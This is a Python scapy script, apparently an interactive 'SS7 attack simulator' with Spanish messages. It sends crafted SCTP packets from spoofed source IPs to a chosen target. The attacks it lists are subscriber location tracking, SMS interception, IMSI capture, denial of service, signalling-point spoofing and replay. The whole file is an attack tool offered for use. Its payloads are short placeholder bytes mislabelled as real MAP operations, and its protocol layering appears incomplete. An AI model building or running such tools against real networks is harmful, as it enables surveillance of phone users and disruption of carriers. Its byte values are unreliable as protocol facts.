from scapy.all import *
from scapy.layers.inet import IP
from scapy.layers.sctp import SCTP
import struct
import random
import time

ATAQUES_SS7 = {
    "location": "Consulta de ubicación de un suscriptor (SendRoutingInfo)",
    "sms_intercept": "Redirección maliciosa de mensajes SMS",
    "imsi_capture": "Captura del IMSI del abonado (SendIdentification)",
    "deny_service": "Envío de tráfico malformado para denegar servicio",
    "spoof_opc": "Suplantación del punto de señalización (OPC falso)",
    "replay": "Repetición de un paquete SS7 anterior (ataque de repetición)"
}

class SS7Attacker:
    def __init__(self, dst_ip, iface="eno2"):
        self.dst_ip = dst_ip
        self.iface = iface
        self.replay_pkt = None  # Para el ataque replay

    def _create_mtp3_layer(self, opc, dpc):
        assert 0 <= opc <= 0xFFFFFF, "❌ OPC fuera de rango (0 - 0xFFFFFF)"
        assert 0 <= dpc <= 0xFFFFFF, "❌ DPC fuera de rango (0 - 0xFFFFFF)"

        return struct.pack("!HHBBBBBB",
                           (0x83 << 8) | 0x00,
                           random.randint(0, 65535),
                           (opc >> 16) & 0xFF,
                           (opc >> 8) & 0xFF,
                           opc & 0xFF,
                           (dpc >> 16) & 0xFF,
                           (dpc >> 8) & 0xFF,
                           dpc & 0xFF)

    def _get_payload(self, attack_type):
        if attack_type == "location":
            return b"\x12\x34\x01\x00\x01\x02"  # SendRoutingInfo
        elif attack_type == "sms_intercept":
            return b"\x23\x45\x99\x00\x02\x04"  # ForwardSM
        elif attack_type == "imsi_capture":
            return b"\x33\x55\x88\x00\x03\x06"  # ProvideSubscriberInfo
        elif attack_type == "deny_service":
            return b"\xFF\xFF\xFF"              # Malformed payload
        elif attack_type == "spoof_opc":
            return b"\x44\x66\x77\x00\x04\x07"  # Payload válida con OPC falso
        elif attack_type == "replay":
            if self.replay_pkt:
                return self.replay_pkt
            else:
                return b"\x55\x77\x66\x00\x05\x08"  # Primer replay
        else:
            return b"\x00\x00\x00"

    def send_attack(self, attack_type="location", count=5):
        print(f"\n[*] Iniciando ataque SS7 ({attack_type}) contra {self.dst_ip}")
        print(f"[📖] Descripción: {ATAQUES_SS7.get(attack_type, 'No documentado')}")

        for i in range(count):
            ip = IP(dst=self.dst_ip, src=random.choice(["10.10.10.1", "10.10.10.2"]))
            sctp = SCTP(sport=2905, dport=2905, tag=random.randint(1, 0xFFFFFFFF))

            opc = random.randint(1, 4095)
            dpc = random.randint(1, 4095)

            if attack_type == "spoof_opc":
                opc = 0  # Usar OPC inválido

            mtp3 = self._create_mtp3_layer(opc=opc, dpc=dpc)
            payload = self._get_payload(attack_type)

            if attack_type == "replay" and self.replay_pkt:
                pkt = self.replay_pkt
            else:
                pkt = ip / sctp / Raw(load=mtp3 + payload)
                if attack_type == "replay" and not self.replay_pkt:
                    self.replay_pkt = pkt  # Guardar para próximos

            send(pkt, iface=self.iface, verbose=0)
            print(f"🚀 Paquete {i+1}/{count} enviado.")
            time.sleep(0.5)

        print("✅ Ataque finalizado.\n")


if __name__ == "__main__":
    print("💥 Simulador de Ataques SS7 (interactivo)\n")

    print("🔎 Opciones de ataque disponibles:")
    for atk, desc in ATAQUES_SS7.items():
        print(f"   - {atk}: {desc}")

    attack_type = input("\n⚠️  Selecciona el tipo de ataque: ").strip()
    if attack_type not in ATAQUES_SS7:
        print("❌ Ataque no válido.")
        exit(1)

    dst_ip = input("🌐 IP de destino: ").strip()
    if not dst_ip:
        print("❌ IP no válida.")
        exit(1)

    try:
        count = int(input("🔁 Número de paquetes a enviar [5]: ").strip())
    except ValueError:
        count = 5

    iface = input("🌐 Interfaz de red [eno2]: ").strip()
    if not iface:
        iface = "eno2"

    attacker = SS7Attacker(dst_ip=dst_ip, iface=iface)
    attacker.send_attack(attack_type, count)
